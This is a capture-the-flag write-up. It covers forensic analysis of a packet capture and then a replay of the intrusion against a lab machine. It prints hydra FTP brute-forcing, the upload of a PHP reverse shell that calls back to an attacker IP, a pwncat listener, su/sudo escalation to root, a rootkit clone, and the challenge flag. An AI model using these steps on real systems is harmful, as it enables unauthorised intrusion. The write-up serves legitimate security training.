# h4cked

Laurent Chauvin | November 03, 2022

## Resources

## Progress

### Task 1 : Oh no! We've been hacked!

Running wireshark
```
wireshark Capture.pcapng
```

After a brief overview, it seems 'jenny' got her ftp password bruteforced (probably with ```hydra```).

But let's follow streams.

We can see a successful login on TCP Stream 7.
```
PASS password123
230 Login successful.
``` 

On Stream 16, a 'shell.php' has been uploaded
```
220 Hello FTP World!
USER jenny
331 Please specify the password.
PASS password123
230 Login successful.
SYST
215 UNIX Type: L8
PWD
257 "/var/www/html" is the current directory
PORT 192,168,0,147,225,49
200 PORT command successful. Consider using PASV.
LIST -la
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 192,168,0,147,196,163
200 PORT command successful. Consider using PASV.
STOR shell.php
150 Ok to send data.
226 Transfer complete.
SITE CHMOD 777 shell.php
200 SITE CHMOD command ok.
QUIT
221 Goodbye.
```

The content of the revershell (from PentestMonkey) can be found on Stream 18, with connection info
```
$ip = '192.168.0.147';  // CHANGE THIS
$port = 80;       // CHANGE THIS
```

On Stream 19, revershell is called
```
GET /shell.php HTTP/1.1
Host: 192.168.0.115
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

We can see them stabilizing the shell on Stream 20
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

On Stream 20, we can see they gain root access on hostname 'wir3' 
```
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls -la
total 1529956
drwxr-xr-x  23 root root       4096 Feb  1 19:52 .
drwxr-xr-x  23 root root       4096 Feb  1 19:52 ..
drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin
drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot
drwxr-xr-x  18 root root       3880 Feb  1 20:05 dev
drwxr-xr-x  94 root root       4096 Feb  1 22:23 etc
drwxr-xr-x   3 root root       4096 Feb  1 20:05 home
lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic
lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib
drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64
drwx------   2 root root      16384 Feb  1 19:49 lost+found
drwxr-xr-x   2 root root       4096 Jul 25  2018 media
drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
dr-xr-xr-x 117 root root          0 Feb  1 20:23 proc
drwx------   3 root root       4096 Feb  1 22:20 root
drwxr-xr-x  29 root root       1040 Feb  1 22:23 run
drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin
drwxr-xr-x   4 root root       4096 Feb  1 20:06 snap
drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv
-rw-------   1 root root 1566572544 Feb  1 19:52 swap.img
dr-xr-xr-x  13 root root          0 Feb  1 20:05 sys
drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp
drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
drwxr-xr-x  14 root root       4096 Feb  1 21:54 var
lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@wir3:/$ su jenny
su jenny
Password: password123

jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: password123

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo su
sudo su
root@wir3:/# whoami
whoami
root
```

Then they clone a git repository (https://github.com/f0rb1dd3n/Reptile.git) of a stealthy backdoor (or rootkit) and try to compile it, but get an error
```
root@wir3:~/Reptile# make
make
make[1]: Entering directory '/root/Reptile/userland'
Makefile:10: ../.config: No such file or directory
make[1]: *** No rule to make target '../.config'.  Stop.
make[1]: Leaving directory '/root/Reptile/userland'
Makefile:56: recipe for target 'userland_bin' failed
make: *** [userland_bin] Error 2
root@wir3:~/Reptile# 
```

### Task 2 : Hack your way back into the machine

```
export IP=10.10.204.164
```

The challenge state that the password has been changed, and ask us to replicate the hack.

So we will probably need to bruteforce Jenny's password with ```hydra``` too.

```
hydra -l jenny -P /opt/rockyou.txt ftp://$IP

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-03 01:54:20
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.204.164:21/
[21][ftp] host: 10.10.204.164   login: jenny   password: 987654321
[STATUS] 14344398.00 tries/min, 14344398 tries in 00:01h, 1 to do in 00:01h, 12 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-03 01:55:28
```

Let's prepare our reverse shell with our IP and port and upload it.
```
ftp $IP          
Connected to 10.10.204.164.
220 Hello FTP World!
Name (10.10.204.164:kali): jenny
331 Please specify the password.
Password: 987654321
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put revshell.php
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||26719|)
150 Ok to send data.
100% |***********************************************************************************************************************************************************************************************|  5494       48.96 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (24.39 KiB/s)
ftp> chmod 777 revshell.php
200 SITE CHMOD command ok.
ftp> exit
221 Goodbye.
```
Don't forget to make your shell executable with chmod.

Let's start pwncat
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

And visit our revshell.php webpage at 'http://$IP/revshell.php'

And.....
```
[02:12:53] Welcome to pwncat 🐈!                                                                                                                                                                                             __main__.py:164
[02:13:00] received connection from 10.10.204.164:55504                                                                                                                                                                           bind.py:84
[02:13:01] 0.0.0.0:9999: upgrading from /bin/dash to /bin/bash                                                                                                                                                                manager.py:957
[02:13:03] 10.10.204.164:55504: registered new host w/ db                                                                                                                                                                     manager.py:957
(local) pwncat$
```

We are back. Let's move to 'jenny' account first.
```
su jenny

Password: 987654321
jenny@wir3:/$ 
```

Now root
```
jenny@wir3:/$ sudo su
[sudo] password for jenny: 987654321
root@wir3:/# whoami

root
```

Let's get the flag in '/root/Reptile' as stated in the challenge.
```
root@wir3:/# cat /root/Reptile/flag.txt 

ebcefd66ca4b559d17b440b6e67fd0fd
```


## Flag

```
ebcefd66ca4b559d17b440b6e67fd0fd
```
